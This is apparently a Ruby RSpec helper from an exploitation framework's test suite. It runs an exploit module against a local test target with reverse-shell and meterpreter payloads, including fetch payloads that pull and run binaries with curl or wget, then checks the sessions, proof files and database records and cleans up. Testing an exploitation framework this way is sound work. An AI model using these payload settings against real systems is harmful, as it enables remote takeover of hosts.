# frozen_string_literal: true

# Use real sessions and independently verify their target and database state.
module CraftAssetSessions
  def ca_session(family, reuse: false)
    owner = CraftAssetTarget::OWNER
    payload, target, type, arch, tool = {
      'php' => ['php/meterpreter/reverse_tcp', 0, 'meterpreter', nil, nil],
      'bash' => ['cmd/unix/reverse_bash', 1, 'shell', nil, nil],
      'fetch-x86' => ['cmd/linux/http/x86/meterpreter_reverse_tcp', 1, 'meterpreter', 1, 'CURL'],
      'fetch-staged-x64' => ['cmd/linux/http/x64/meterpreter/reverse_tcp', 1, 'meterpreter', 2, 'WGET']
    }.fetch(family)
    @ca_ready ||= rc_json("begin;load 'test/module_targets/druid_sessions/session_control.rb';DruidSessionControl.install(framework);end")
    @workspace = "craft_#{Process.pid}_asset#{family.delete('-')}#{reuse ? 'repeat' : 'first'}"
    expect(console_command('workspace -a ' + @workspace)).not_to include('[-]')
    port = cf_port
    destination = "/tmp/module-target-craftasset-fetch-#{Process.pid}-#{port}" if arch
    destination_absent = destination && !it_file(destination).fetch('exists')
    expect(destination_absent).to be(true) if destination
    options = {
      'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port,
      'ReverseListenerBindAddress' => '0.0.0.0', 'DisablePayloadHandler' => false,
      'AutoCheck' => !reuse, 'WfsDelay' => 25, 'HttpClientTimeout' => 5
    }
    options.merge!('SessionRetryTotal' => 10, 'SessionRetryWait' => 1, 'SessionExpirationTimeout' => 60, 'SessionCommunicationTimeout' => 15) if type == 'meterpreter'
    options['SessionExpirationTimeout'] = 30 if family == 'php'
    if arch
      options.merge!(
        'FETCH_COMMAND' => tool, 'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => cf_port,
        'FetchListenerBindAddress' => '0.0.0.0', 'FETCH_WRITABLE_DIR' => '/tmp',
        'FETCH_FILENAME' => File.basename(destination), 'FETCH_DELETE' => true
      )
    end
    attempt = { family: family, repeat: reuse, workspace: @workspace, qualified: false }
    @rc.fetch(:session_attempts) << attempt
    before = ca_session_files
    offset = ca_events.length
    output = run_target_module(owner, 'app', options, action: 'run -z', reuse_module: reuse, allow_errors: true)
    attempt[:output_base64] = Base64.strict_encode64(output.b)
    attempt[:selected_instance] = rc_json('active_module.object_id')
    expect(attempt.fetch(:selected_instance)).to eq(@ca_previous_session_instance) if reuse
    @ca_previous_session_instance = attempt.fetch(:selected_instance)
    metadata = rc_poll(35) do
      sessions = rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload,db_id:session.db_record&.id}}')
      ready = File.readlines(@ca_ready.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |row| row['db_id'] && ready.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(metadata.values_at('type', 'owner', 'payload')).to eq([type, owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    attempt[:metadata] = metadata
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    proof_absent = !it_file(proof).fetch('exists')
    expect(proof_absent).to be(true)
    if type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      content = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;session=framework.sessions.fetch(#{identifier});file=nil;begin;file=session.fs.file.new(#{proof.inspect},'wb');file.write('craft-asset-session');ensure;file.close if file;end;{pid:session.sys.process.getpid,identity:session.sys.config.getuid,api:'fs.file'};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      content = 'craft-asset-session'
    end
    expect(result).not_to have_key('error')
    expect(it_file(proof)).to eq('exists' => true, 'uid' => it_expected_uid, 'base64' => Base64.strict_encode64(content))
    native = cc_process(result.fetch('pid'))
    expect(native).to include('exists' => true, 'uid' => it_expected_uid)
    expect(cc_tcp(port)).to include(include('state' => '01', 'uid' => it_expected_uid))
    attempt[:events] = rc_json("framework.instance_variable_get(:@craft_asset_events)[#{offset}..]")
    check_calls = attempt.fetch(:events).select { |event| event['event'] == 'call' && event['method'] == 'check' }
    expect(check_calls.empty?).to eq(reuse)
    if arch
      delivery = attempt.fetch(:events).select { |event| event.fetch('event') == 'delivery' }.last
      expect(delivery).to include('elf_class' => arch, 'sha256' => native.fetch('exe_sha256'))
    end
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT session.id,session.stype,session.via_exploit,session.via_payload FROM sessions session JOIN hosts host ON host.id=session.host_id JOIN workspaces workspace ON workspace.id=host.workspace_id WHERE workspace.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => type, 'via_exploit' => owner, 'via_payload' => 'payload/' + payload))
    attempt.merge!(proof: result, native_process: native, delivery: delivery, reports: reports, qualified: true)
    @rc.fetch(:sessions) << attempt
  ensure
    original_error = $ERROR_INFO
    begin
      if proof_absent
        rc_command('remove-asset-session-proof', 'app', 'rm', '-f', proof)
        expect(it_file(proof)).to include('exists' => false)
      end
      remaining = rc_json('framework.sessions.keys')
      remaining.each do |session_id|
        exit_result = rc_json("DruidSessionControl.dispatch(framework,'exit',#{session_id})")
        expect(exit_result).not_to have_key('error') unless original_error
        rc_json("begin;session=framework.sessions[#{session_id}];session.kill if session;{closed:#{session_id}};end")
      end
      if identifier
        rc_poll { cc_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
        rc_poll { !cc_process(result.fetch('pid')).fetch('exists') } if result && family != 'php'
        closed = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{metadata.fetch('db_id')}) row")).find { |row| row['closed_at'] } }
        attempt[:closed_report] = closed
      end
      console_command('jobs -K')
      expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
      rc_poll { !it_file(destination).fetch('exists') } if destination_absent
      attempt[:events] = ca_events.drop(offset) if attempt && offset
      ca_cleanup_sessions(attempt.fetch(:events), before) if attempt && offset
      expect(cc_snapshot).to eq(@baseline) if @baseline
      rc_resources('after-asset-session')
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { type: e.class.name, message: e.message, primary_error: original_error&.message }
      raise unless original_error
    ensure
      rc_save
    end
  end
end
